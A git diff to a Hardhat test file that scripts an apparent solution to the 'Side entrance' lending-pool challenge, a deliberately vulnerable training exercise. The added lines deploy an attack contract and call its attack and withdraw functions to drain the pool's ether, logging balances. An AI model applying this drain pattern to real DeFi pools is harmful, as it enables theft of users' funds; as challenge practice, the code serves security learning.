@@ -10,10 +10,17 @@ describe('[Challenge] Side entrance', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
+        console.log("\nattacker : ",attacker.address)
 
         const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
+        const AttackSideEntranceFactory = await ethers.getContractFactory('AttackSideEntrance', attacker);
+
         this.pool = await SideEntranceLenderPoolFactory.deploy();
+        this.AttackSideEntrance = await AttackSideEntranceFactory.deploy(this.pool.address);
         
+        console.log("pool : ",this.pool.address)
+        console.log("AttackSideEntrance : ",this.AttackSideEntrance.address)
+        console.log()
         await this.pool.deposit({ value: ETHER_IN_POOL });
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
@@ -25,6 +32,17 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log("\nAttack Contract Balance (1): ",String(await ethers.provider.getBalance(this.AttackSideEntrance.address)))
+        tx = await this.AttackSideEntrance.connect(attacker).attack(ETHER_IN_POOL)
+        tx.wait()
+
+        console.log("\nAttack Contract Balance (2): ",String(await ethers.provider.getBalance(this.AttackSideEntrance.address)))
+
+        tx = await this.AttackSideEntrance.connect(attacker).withdraw()
+        tx.wait()
+
+        console.log("\nAttack Contract Balance (3): ",String(await ethers.provider.getBalance(this.AttackSideEntrance.address)))
+
     });
 
     after(async function () {
